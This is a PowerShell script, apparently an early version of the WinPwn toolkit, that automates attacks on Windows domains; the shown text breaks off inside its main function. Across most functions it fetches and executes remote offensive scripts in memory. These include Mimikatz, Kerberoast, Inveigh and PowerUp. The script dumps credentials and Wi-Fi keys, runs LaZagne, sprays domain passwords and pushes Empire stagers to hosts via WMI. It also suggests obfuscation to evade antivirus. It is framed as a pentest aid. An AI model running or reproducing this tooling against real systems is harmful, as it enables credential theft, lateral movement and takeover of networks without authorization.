#Zipping Function
Add-Type -AssemblyName System.IO.Compression.FileSystem
function Unzip
{
    param([string]$zipfile, [string]$outpath)

    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
}

function dependencychecks
{
    <#
        .DESCRIPTION
        Checks for System Role, Powershell Version, Proxy active/not active, Elevated or non elevated Session.
        Creates the Log directories or checks if they are already available.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    #Privilege Escalation Phase
         [int]$systemRoleID = $(get-wmiObject -Class Win32_ComputerSystem).DomainRole



         $systemRoles = @{
                              0         =    " Standalone Workstation    " ;
                              1         =    " Member Workstation        " ;
                              2         =    " Standalone Server         " ;
                              3         =    " Member Server             " ;
                              4         =    " Backup  Domain Controller " ;
                              5         =    " Primary Domain Controller "       
         }

        #Proxy Detect #1
        proxydetect
        
        $PSVersion=$PSVersionTable.PSVersion.Major
        $currentPath = (Get-Item -Path ".\" -Verbose).FullName
        Write-Host 'Current Path is: '$currentPath''
        
        Write-Host -ForegroundColor Yellow 'Creating Log Folders in '$currentPath' directory:'
        
        if (Test-Path $currentPath\LocalRecon\)
        {
            Write-Host -ForegroundColor Red ''$currentPath\Localrecon' already exists'
        }
        else {mkdir $currentPath\LocalRecon\}
        
        if (Test-Path $currentPath\DomainRecon\)
        {
            Write-Host -ForegroundColor Red ''$currentPath\Domainrecon' already exists'
        }
        else {mkdir $currentPath\DomainRecon\;mkdir $currentPath\DomainRecon\ADrecon}
        
        if (Test-Path $currentPath\LocalPrivEsc\)
        {
            Write-Host -ForegroundColor Red ''$currentPath\LocalPrivEsc\' already exists'
        }
        else {mkdir $currentPath\LocalPrivEsc\}
        
        if (Test-Path $currentPath\Exploitation\)
        {
            Write-Host -ForegroundColor Red ''$currentPath\Exploitation\' already exists'
        }
        else {mkdir $currentPath\Exploitation\}
        
        if (Test-Path $currentPath\Forensics\)
        {
            Write-Host -ForegroundColor Red ''$currentPath\Forensics\' already exists'
        }
        else {mkdir $currentPath\Forensics\}
        
        
        Write-Host "[?] Checking for administrative privileges ..`n" -ForegroundColor black -BackgroundColor white  ; sleep 1
        
        $isAdmin = ([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
        
        if(!$isAdmin){
                
                Write-Warning  "[-] Some of the operations need administrative privileges.`n"
                
                Write-Warning  "[*] Please run the script using an administrative account if you have one.`n"
                
                Read-Host "Type any key to continue .."
        }
        
        write-host "[?] Checking for Default PowerShell version ..`n" -ForegroundColor black -BackgroundColor white  ; sleep 1
        
        if($PSVersion -lt 2){
           
                Write-Warning  "[!] You have PowerShell v1.0.`n"
            
                Write-Warning  "[!] This script only supports Powershell verion 2 or above.`n"
            
                read-host "Type any key to continue .."
            
                exit  
        }
        
        write-host "       [+] ----->  PowerShell v$PSVersion`n" ; sleep 1
        
        write-host "[?] Detecting system role ..`n" -ForegroundColor black -BackgroundColor white ; sleep 1
        
        $systemRoleID = $(get-wmiObject -Class Win32_ComputerSystem).DomainRole
        
        if($systemRoleID -ne 1){
        
                "       [-] This script needs access to the domain. It can only be run on a domain member machine.`n"
               
                Read-Host "Type any key to continue .."
                   
        }
        
        write-host "       [+] ----->",$systemRoles[[int]$systemRoleID],"`n" ; sleep 1
}



function isadmin
{
    # Check if Elevated
    $isAdmin = ([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
    return $isAdmin
}

function Inveigh {
<#
    .DESCRIPTION
        Starts Inveigh in a parallel window.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
       
    if (isadmin)
    {
            invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Headers.Add(“user-agent”, “Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0”);$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1'');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y;}'
    }
    else 
    {
           invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Headers.Add(“user-agent”, “Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0”);$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1'');Invoke-Inveigh -ConsoleOutput Y -NBNS Y;}'
    }
    #TODO: Inveigh SMB Relay Attack??
    #IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh-Relay.ps1')
}


function sessionGopher {
<#
    .DESCRIPTION
        Starts SessionGopher to search for Cached Credentials.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fireeye/SessionGopher/master/SessionGopher.ps1')
    $whole_domain = Read-Host -Prompt 'Do you want to start SessionGopher search over the whole domain? (yes/no) - takes a lot of time'
    if ($whole_domain -eq "yes" -or $whole_domain -eq "y" -or $whole_domain -eq "Yes" -or $whole_domain -eq "Y")
    {
            $session = Read-Host -Prompt 'Do you want to start SessionGopher with thorough tests? (yes/no) - takes a fuckin lot of time'
            if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
            {
                Write-Host -ForegroundColor Yellow 'Starting Local SessionGopher, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
                Invoke-SessionGopher -Thorough -AllDomain >> $currentPath\LocalRecon\SessionGopher.txt -Outfile
            }
            else 
            {
                Write-Host -ForegroundColor Yellow 'Starting SessionGopher without thorough tests, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
                Invoke-SessionGopher -AllDomain >> $currentPath\LocalRecon\SessionGopher.txt
            }
    }
    else
    {
        $session = Read-Host -Prompt 'Do you want to start SessionGopher with thorough tests? (yes/no) - takes a lot of time'
            if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
            {
                Write-Host -ForegroundColor Yellow 'Starting Local SessionGopher, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
                Invoke-SessionGopher -Thorough >> $currentPath\LocalRecon\SessionGopher.txt -Outfile
            }
            else 
            {
                Write-Host -ForegroundColor Yellow 'Starting SessionGopher without thorough tests,output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
                Invoke-SessionGopher >> $currentPath\LocalRecon\SessionGopher.txt
            }
    }
}


function Mimikatzlocal {
<#
    .DESCRIPTION
        Dumps Credentials from Memory / SAM Database.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    
    if (isadmin)
    {
            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-WLAN-Keys.ps1')
            
            $output_file = Read-Host -Prompt 'Save credentials to a local text file? (yes/no)'
            if ($output_file -eq "yes" -or $output_file -eq "y" -or $output_file -eq "Yes" -or $output_file -eq "Y")
            {
                Write-Host -ForegroundColor Yellow 'Dumping Credentials from Memory and SAM Database, because we can:'
                Invoke-Mimikatz >> $currentPath\Exploitation\Credentials.txt
                Get-WLAN-Keys >> $currentPath\Exploitation\WIFI_Keys.txt
            }
            else
            {
            Invoke-Mimikatz
            Get-WLAN-Keys
            }
    }
    else{Write-Host -ForegroundColor Yellow 'You need local admin rights for this!'}

}


function localreconmodules
{
<#
        .DESCRIPTION
        All local recon scripts are executed here.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
            #Local Reconning
            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Get-ComputerDetails.ps1')
            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')

            Write-Host -ForegroundColor Yellow 'Starting local Recon phase:'


            if (isadmin)
            {
                invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Headers.Add(“user-agent”, “Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0”);$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/threatexpress/red-team-scripts/master/HostEnum.ps1'');Invoke-HostEnum >> .\LocalRecon\HostEnum.txt}'
                 $PSrecon = Read-Host -Prompt 'Do you want to gather local computer Informations with PSRecon? (yes/no)'
                if ($PSrecon -eq "yes" -or $PSrecon -eq "y" -or $PSrecon -eq "Yes" -or $PSrecon -eq "Y")
                {
                    invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Headers.Add(“user-agent”, “Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0”);$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;Invoke-WebRequest -Uri ''https://raw.githubusercontent.com/gfoss/PSRecon/master/psrecon.ps1'' -Outfile .\LocalRecon\Psrecon.ps1;Write-Host -ForegroundColor Yellow ''Starting PsRecon:'';.\LocalRecon\Psrecon.ps1;pause}'
                }
                Write-Host -ForegroundColor Yellow "Saving general computer information to $currentPath\LocalRecon\Computerdetails.txt:"
                Get-ComputerDetails >> "$currentPath\LocalRecon\Computerdetails.txt"

                Write-Host -ForegroundColor Yellow 'Starting WINSpect:'
            invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Headers.Add(“user-agent”, “Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0”);$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/A-mIn3/WINspect/master/WINspect.ps1'');}'
            }

         
            $session = Read-Host -Prompt 'Do you want to start SessionGopher module? (yes/no)'
            if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
            {
                sessionGopher
            }

            $search = Read-Host -Prompt 'Do you want to search for sensitive files on this local system? (config files, rdp files, password files and more) (yes/no) - takes a lot of time'
            if ($search -eq "yes" -or $search -eq "y" -or $search -eq "Yes" -or $search -eq "Y")
            {
                Write-Host -ForegroundColor Yellow 'Looking for interesting files:'
                Find-InterestingFile -Path 'C:\' -Outfile "$currentPath\LocalRecon\InterestingFiles.txt"
                Find-InterestingFile -Path 'C:\' -Terms pass,login,rdp,kdbx,backup -Outfile "$currentPath\LocalRecon\MoreFiles.txt"
            }
}

function domainreconmodules
{
<#
        .DESCRIPTION
        All domain recon scripts are executed here.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
            #Domain / Network Reconing
            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1')
            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
            $domain_Name = Get-NetDomain
            $Domain = $domain_Name.Name

            Write-Host -ForegroundColor Yellow 'Starting Domain Recon phase:'

            Write-Host -ForegroundColor Yellow 'Creating Domain User-List:'
            Get-DomainUserList -Domain $domain_Name.Name -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii $currentPath\DomainRecon\userlist.txt
            
            Write-Host -ForegroundColor Yellow 'Searching for Exploitable Systems:'
            Get-ExploitableSystem >> $currentPath\DomainRecon\ExploitableSystems.txt
            

            #Powerview
            Write-Host -ForegroundColor Yellow 'All those PowerView Network Skripts for later Lookup getting executed and saved:'
            Get-NetDomain >> $currentPath\DomainRecon\NetDomain.txt
            Get-NetForest >> $currentPath\DomainRecon\NetForest.txt
            Get-NetForestDomain >> $currentPath\DomainRecon\NetForestDomain.txt      
            Get-NetDomainController >> $currentPath\DomainRecon\NetDomainController.txt  
            Get-NetUser >> $currentPath\DomainRecon\NetUser    
            Get-NetComputer >> $currentPath\DomainRecon\NetSystems.txt   
            Get-Printer >> $currentPath\DomainRecon\NetPrinter.txt
            Get-NetOU >> $currentPath\DomainRecon\NetOU.txt    
            Get-NetSite >> $currentPath\DomainRecon\NetSite.txt  
            Get-NetSubnet >> $currentPath\DomainRecon\NetSubnet.txt
            Get-NetGroup >> $currentPath\DomainRecon\NetGroup.txt 
            Get-NetGroupMember >> $currentPath\DomainRecon\NetGroupMember.txt   
            Get-NetFileServer >> $currentPath\DomainRecon\NetFileServer.txt 
            Get-DFSshare >> $currentPath\DomainRecon\DFSshare.txt 
            Get-NetShare >> $currentPath\DomainRecon\NetShare.txt 
            Get-NetLoggedon >> $currentPath\DomainRecon\NetLoggedon
            Get-NetDomainTrust >> $currentPath\DomainRecon\Domaintrusts.txt
            Get-NetForestTrust >> $currentPath\DomainRecon\ForestTrust.txt
            Find-ForeignUser >> $currentPath\DomainRecon\ForeignUser.txt
            Find-ForeignGroup >> $currentPath\DomainRecon\ForeignGroup.txt

            Write-Host -ForegroundColor Yellow 'Starting ACLAnalysis for Shadow Admin detection:'
            invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Headers.Add(“user-agent”, “Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0”);$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/ACLight/master/ACLight2/ACLight2.ps1'');Start-ACLsAnalysis;Write-Host -ForegroundColor Yellow ''Moving Files:'';mv C:\Results\ .\DomainRecon\;}'

            Write-Host -ForegroundColor Yellow 'Downloading ADRecon Script:'
            Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/sense-of-security/ADRecon/master/ADRecon.ps1' -Outfile $currentPath\DomainRecon\ADrecon\recon.ps1
            Write-Host -ForegroundColor Yellow 'Executing ADRecon Script:'
            invoke-expression 'cmd /c start powershell -Command {.\DomainRecon\ADrecon\recon.ps1}'
}


function privescmodules
{
<#
        .DESCRIPTION
        All privesc scripts are executed here.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    #Privilege Escalation Phase
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1')
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1')
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPAutologon.ps1')
    
    Write-Host -ForegroundColor Yellow 'Getting Local Privilege Escalation possibilities:'

    Write-Host -ForegroundColor Yellow 'Getting GPPPasswords:'
    Get-GPPAutologon >> $currentPath\LocalPrivesc\GPP_Auto.txt
    Get-GPPPassword >> $currentPath\LocalPrivesc\GPP_Passwords.txt

    Write-Host -ForegroundColor Yellow 'Looking for Local Privilege Escalation possibilities:'
    Invoke-Allchecks >> $currentPath\LocalPrivesc\All_Localchecks.txt

    Write-Host -ForegroundColor Yellow 'Looking for MS-Exploits on this local system for Privesc:'
    Find-AllVulns >> $currentPath\LocalPrivesc\Sherlock_Vulns.txt
}

function lazagnemodule
{
    <#
        .DESCRIPTION
        Downloads and executes Lazagne from AlessandroZ for Credential gathering / privilege escalation.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    #Privilege Escalation Phase
    Invoke-WebRequest -Uri 'https://github.com/AlessandroZ/LaZagne/releases/download/2.3.1/Windows.zip' -Outfile $currentPath\Lazagne.zip
    Unzip "$currentPath\Lazagne.zip" "$currentPath\Lazagne"
    Write-Host -ForegroundColor Yellow 'Checking, if the file was killed by antivirus:'
    if (Test-Path $currentPath\Lazagne\Windows\laZagne.exe)
    {
        Write-Host -ForegroundColor Yellow 'Not killed, Executing:'
        "$currentPath\Lazagne\Windows\laZagne.exe all" >> $currentPath\Lazagne\Passwords.txt
        Write-Host -ForegroundColor Yellow 'Results saved to $currentPath\Lazagne\Passwords.txt!'
    }
    else {Write-Host -ForegroundColor Red 'Antivirus got it, try an obfuscated version or RAM-Execution with Pupy:'}
}

function latmov
{
    <#
        .DESCRIPTION
        Looks for administrative Access on any system in the current network/domain. If Admin Access is available somewhere, Credentials can be dumped remotely / alternatively Powershell_Empire Stager can be executed.
        Brute Force for all Domain Users with specific Passwords (for example Summer2018) can be done here.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    #Lateral Movement Phase
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ChrisTruncer/WMIOps/master/WMIOps.ps1')
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1')
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1')
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
    $domain_Name = Get-NetDomain
    $Domain = $domain_Name.Name
    
    Write-Host -ForegroundColor Yellow 'Starting Lateral Movement Phase:'

    Write-Host -ForegroundColor Yellow 'Searching for Domain Systems we can pwn with admin rights, this can take a while depending on the size of your domain:'

    Find-LocalAdminAccess >> $currentPath\Exploitation\LocalAdminAccess.txt

    $exploitdecision = Read-Host -Prompt 'Do you want to Dump Credentials on all found Systems or Execute Empire Stager? (dump/empire)'
    if ($exploitdecision -eq "dump" -or $exploitdecision -eq "mimikatz" -or $exploitdecision -eq "Credentials")
    {
        #MassMimikatz
        $massmimikatz = Read-Host -Prompt 'Do you want to use MassMimikatz for all found Systems? (yes/no)'
        if ($massmimikatz -eq "yes" -or $massmimikatz -eq "y" -or $massmimikatz -eq "Yes" -or $massmimikatz -eq "Y")
        {
           if (Test-Path $currentPath\Exploitation\LocalAdminAccess.txt)
           {
               Invoke-MassMimikatz -Hostlist $currentPath\Exploitation\LocalAdminAccess.txt >> $currentPath\Exploitation\PwnedSystems_Credentials.txt
           }
           else { Write-Host -ForegroundColor Red 'No Systems with admin-Privileges found in this domain' }
        }
    }
    elseif ($exploitdecision -eq "empire" -or $exploitdecision -eq "RAT" -or $exploitdecision -eq "C&C")
    {
        empirelauncher
    }
    #Domainspray
    $domainspray = Read-Host -Prompt 'Do you want to Spray the Network with prepared Credentials? (yes/no)'
    if ($domainspray -eq "yes" -or $domainspray -eq "y" -or $domainspray -eq "Yes" -or $domainspray -eq "Y")
    {

       if (Test-Path $currentPath\passlist.txt) 
        {
            Invoke-DomainPasswordSpray -UserList $currentPath\DomainRecon\userlist.txt -Domain $domain_Name.Name -PasswordList $currentPath\passlist.txt -OutFile $currentPath\Exploitation\Pwned-creds_Domainpasswordspray.txt
        }
        else 
        { 
           Write-Host -ForegroundColor Red 'There is no passlist.txt File in the current folder'
           $passlist = Read-Host -Prompt 'Please enter one Password for DomainSpray manually:'
           $passlist >> $currentPath\passlist.txt
           Invoke-DomainPasswordSpray -UserList $currentPath\DomainRecon\userlist.txt -Domain $domain.Name -PasswordList $currentPath\passlist.txt -OutFile $currentPath\Exploitation\Pwned-creds_Domainpasswordspray.txt  
        }
    }
}

function empirelauncher
{
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-WmiCommand.ps1')
    #IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/lateral_movement/Invoke-PsExec.ps1') maybe an alternative later on.
    if (Test-Path $currentPath\Exploitation\LocalAdminAccess.txt)
    {
        $exploitHosts = Get-Content "$currentPath\Exploitation\LocalAdminAccess.txt"
    }
    else
    {
        $file = "$currentPath\Exploitation\Exploited_Empire.txt"
        While($i -ne "quit") 
        {
	        If ($i -ne $NULL) 
            {
		        $i.Trim() | Out-File $file -append
	        }
	        $i = Read-Host -Prompt 'Please provide one or more IP-Adress as target:'    
        }

    }

    $stagerfile = "$currentPath\Exploitation\Empire_Stager.txt"
    While($Payload -ne "quit") 
    {
	    If ($Payload -ne $NULL) 
        {
	        $Payload.Trim() | Out-File $stagerfile -append
	    }
        $Payload = Read-Host -Prompt 'Please provide the powershell Empire Stager payload (beginning with "powershell -noP -sta -w 1 -enc  BASE64Code") :'
    }
    
    $executionwith = Read-Host -Prompt 'Use the current User for Payload Execution? (yes/no):'

    if (Test-Path $currentPath\Exploitation\Exploited_Empire.txt)
    {
        $Hosts = Get-Content "$currentPath\Exploitation\Exploited_Empire.txt"
    }
    else {$Hosts = Get-Content "$currentPath\Exploitation\LocalAdminAccess.txt"}

    if ($executionwith -eq "yes" -or $executionwith -eq "y" -or $executionwith -eq "Yes" -or $executionwith -eq "Y")
    {
        $Hosts | Invoke-WmiCommand -Payload $Payload
    }
    else 
    {
        $Credential = Get-Credential
        $Hosts | Invoke-WmiCommand -Payload $Payload -Credential $Credential
    }
}

function shareenumeration
{
    <#
        .DESCRIPTION
        Enumerates Shares in the current network, also searches for sensitive Files on the local System + Network.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    #Enumeration Phase
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
    Write-Host -ForegroundColor Yellow 'Searching for sensitive Files on the Domain-Network, this can take a while:'
    Invoke-FileFinder >> $currentPath\SensitiveFiles.txt
    Invoke-ShareFinder -ExcludeStandard >> $currentPath\Networkshares.txt
}

function groupsearch
{
    <#
        .DESCRIPTION
        AD can be searched for specific User/Group Relations over Group Policies.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    #Enumeration Phase
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
    $user = Read-Host -Prompt 'Do you want to search for other users than the session-user? (yes/no)'
            if ($user -eq "yes" -or $user -eq "y" -or $user -eq "Yes" -or $user -eq "Y")
            {
                $username = Read-Host -Prompt 'Please enter a username to search for: (without domain-name)'
                $group = Read-Host -Prompt 'Please enter a Group-Name to search for: (Administratoren,Remotedesktopbenutzer)'
                Write-Host -ForegroundColor Yellow 'Searching...:'
                Find-GPOLocation -GroupName $group -UserName $username >> $currentPath\Groupsearches.txt
            }
            $group = Read-Host -Prompt 'Please enter a Group-Name to search for: (Administratoren,Remotedesktopbenutzer)'

            Write-Host -ForegroundColor Yellow 'Searching...:'
            Find-GPOLocation -GroupName $group -UserName $env:UserName
            Find-GPOLocation -GroupName $group -UserName $env:UserName >> $currentPath\Groupsearches.txt
            Write-Host -ForegroundColor Yellow "Systems saved to >> $currentPath\Groupsearches.txt:"
            $rdp = Read-Host -Prompt 'Do you want to search for more Systems/Groups? (yes/no)'
}

function proxydetect
{
    <#
        .DESCRIPTION
        Checks, if a proxy is active. Uses current users credentials for Proxy Access / other user input is possible as well.
        Author: @securethisshit
        License: BSD 3-Clause
    #>    
    #Proxy Detect #1
    Write-Host -ForegroundColor Yellow 'Searching for network proxy...'

    $reg2 = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('CurrentUser', $env:COMPUTERNAME)
    $regkey2 = $reg2.OpenSubkey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings")

    if ($regkey2.GetValue('ProxyServer') -and $regkey2.GetValue('ProxyEnable'))
    {
        $proxy = Read-Host -Prompt 'Proxy detected! Proxy is: '$regkey2.GetValue('ProxyServer')'! Does the Powershell-User have proxy rights? (yes/no)'
        if ($proxy -eq "yes" -or $proxy -eq "y" -or $proxy -eq "Yes" -or $proxy -eq "Y")
        {
             #Proxy
            Write-Host -ForegroundColor Yellow 'Setting up Powershell-Session Proxy Credentials...'
            $Wcl = new-object System.Net.WebClient
            $Wcl.Headers.Add(“user-agent”, “Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0”)
            $Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
        }
        else
        {
            Write-Host -ForegroundColor Yellow 'Please enter valid credentials, or the script will fail!'
            #Proxy Integration manual user
            $webclient=New-Object System.Net.WebClient
            $creds=Get-Credential
            $webclient.Proxy.Credentials=$creds
        }
   }
    else {Write-Host -ForegroundColor Yellow 'No proxy detected, continuing... '}
}

function kerberoasting
{
    #Exploitation Phase
    Write-Host -ForegroundColor Yellow 'Starting Exploitation Phase:'
    Write-Host -ForegroundColor Red 'Kerberoasting active:'
    invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Headers.Add(“user-agent”, “Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0”);$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1'');Invoke-Kerberoast -OutputFormat Hashcat | fl >> .\Exploitation\Kerberoasting.txt;Write-Host -ForegroundColor Yellow ''Module finished, Hashes saved to .\Exploitation\Kerberoasting.txt:'' ;pause}'
}

function WinPwn
{
    <#
        .DESCRIPTION
        Main Function. Executes the other functions according to the users input.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
    $forensicMode = Read-Host -Prompt 'Do you want to use forensic- or pentest-Mode? (forensic/pentest)'
    if ($forensicMode -eq "forensic" -or $forensicMode -eq "f" -or $forensicMode -eq "for")
    {
        if (isadmin)
        {
            Write-Host -ForegroundColor Green "Elevated PowerShell session detected. Continuing."
    
    
            #Loki Start
            Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/blob/master/loki.exe?raw=true' -Outfile $currentPath\loki.exe
            Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/blob/master/loki.zip?raw=true' -Outfile $currentPath\loki.zip
            Unzip "$currentPath\loki.zip" "$currentPath\"
            Write-Host -ForegroundColor Yellow 'Checking, loki download was successfull:'
            if (Test-Path $currentPath\loki.exe)
            {
                Write-Host -ForegroundColor Yellow 'Good... Starting Loki!'
                invoke-expression 'cmd /c start powershell -Command {.\loki.exe}'
                Write-Host -ForegroundColor Yellow 'Results will be saved to '$currentPath\Forensics\Loki_Results.txt'!'
            }
            else {Write-Host -ForegroundColor Red 'Zip File could not be unpacked...'}
    
    
            $PSrecon = Read-Host -Prompt 'Do you want to gather local computer Informations with PSRecon? (yes/no)'
            if ($PSrecon -eq "yes" -or $PSrecon -eq "y" -or $PSrecon -eq "Yes" -or $PSrecon -eq "Y")
            {
                Write-Host -ForegroundColor Yellow 'Starting PsRecon:'
                Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/gfoss/PSRecon/master/psrecon.ps1' -Outfile $currentPath\LocalRecon\Psrecon.ps1
                .\Psrecon.ps1
            }
    
            #ThreadHunting Functions
            Invoke-WebRequest -Uri 'https://github.com/DLACERT/ThreatHunting/archive/master.zip' -Outfile $currentPath\ThreadHunting.zip
            Unzip "$currentPath\ThreadHunting.zip" "$currentPath\Forensics\"
            Write-Host -ForegroundColor Yellow 'Checking, if folder was unzipped successfully:'
            if (Test-Path $currentPath\Forensics\ThreatHunting-master\ThreatHunting.psm1)
            {
                Write-Host -ForegroundColor Yellow 'Good...'
                Get-ChildItem *.ps* -Recurse | Unblock-File
                Import-Module $currentPath\Forensics\ThreadHunting-master\ThreatHunting.psm1
                Write-Host -ForegroundColor Yellow 'ThreadHunting Functions imported...'
    
                #TODO
            }
            else {Write-Host -ForegroundColor Red 'Zip File could not be unpacked...'}
    
        }
        else{Write-Host -ForegroundColor Red 'You need to be admin for forensic-Mode'} 
    }
    else
    {
        if (isadmin)
        {
            Write-Host -ForegroundColor Green "Elevated PowerShell session detected. Continuing."
        }
        else
        {
            Write-Host -ForegroundColor Red "Only running non-elevated PowerShell commands. Please launch an elevated session if you have local Administrator Credentials and try again."
        }
            Write-Host -ForegroundColor Yellow 'Getting Scripts to Memory'
    
            # To be added for lateral movement
            #IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Pivot/Create-MultipleSessions.ps1')
            #IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fireeye/SessionGopher/master/SessionGopher.ps1')
            #IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1')
            #IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ChrisTruncer/WMIOps/master/WMIOps.ps1')
            #IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1')
            #IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1')
